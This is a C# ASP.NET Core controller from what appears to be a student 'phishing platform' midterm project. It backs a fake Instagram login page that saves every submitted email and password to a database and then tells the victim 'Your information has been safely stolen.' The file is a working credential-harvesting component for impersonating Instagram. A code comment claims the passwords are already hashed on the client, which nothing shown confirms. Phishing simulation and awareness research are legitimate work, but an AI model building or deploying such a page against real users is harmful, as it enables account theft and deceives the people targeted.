using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Routing;
using Phishing_Platform_Midterm.Entities;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Phishing_Platform_Midterm.Context;

namespace Phishing_Testing_Midterm.Controllers;

public class InstagramController : Controller
{
    private readonly MyDbContext _dataBaseContext;

    public InstagramController(MyDbContext dataBaseContext)
    {
        this._dataBaseContext = dataBaseContext;
    }
    
    public IActionResult Ilogin()
    {
       return View();
    }

    [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Ilogin(User user)
        {
            if (!ModelState.IsValid)
            {
                foreach (var modelStateKey in ModelState.Keys)
                {
                    var errors = ModelState[modelStateKey].Errors;

                    foreach (var error in errors)
                    {
                        Console.WriteLine($"Key: {modelStateKey}, Error: {error.ErrorMessage}");
                    }
                }
            }
            // Validate the input (add more validation as needed)
            if (string.IsNullOrEmpty(user.Email) || string.IsNullOrEmpty(user.Password))
            {
                TempData["ErrorMessage"] = "Please enter a valid email or phone number.";
                return RedirectToAction("Ilogin");
            }

            try
            {
                // Create a new user instance
                var newUser = new User
                {
                    Email = user.Email,
                    Password = user.Password, // No need to hash the password here, as it's already hashed on the client side
                    Sourcepage = "Instagram",
                    RegistrationDate = DateTime.UtcNow
                };

                // Add the new user to the database
                _dataBaseContext.Users.Add(newUser);
                await _dataBaseContext.SaveChangesAsync();

                // Redirect to a success page or perform other actions
                // For now, redirect to the source page (you might want to adjust this logic)
                TempData["SuccessMessage"] = "Your information has been safely stolen.";
                return RedirectToAction("Ilogin");
            }
            catch (Exception ex)
            {
                // Handle exceptions, log the error, and redirect to an error page
                TempData["ErrorMessage"] = "An error occurred while processing your request.";
                return RedirectToAction("Ilogin");
            }
        }
    //public void Addemails()
    //{
        // If the user doesn't exist, you can create a new user and save it to the database
        //    var newUser = new User
        // {
        //   Email = "instagram@gmail.com",
        //   Password = "instagram", // Note: You should hash the password before saving it to the database
        //    Sourcepage = "Instagram",
        //   RegistrationDate = DateTime.Now // Set the registration date to the current date and time
        //};

        // Add the new user to the database
        //_dataBaseContext.Users.Add(newUser);
        //_dataBaseContext.SaveChanges();
        // }
}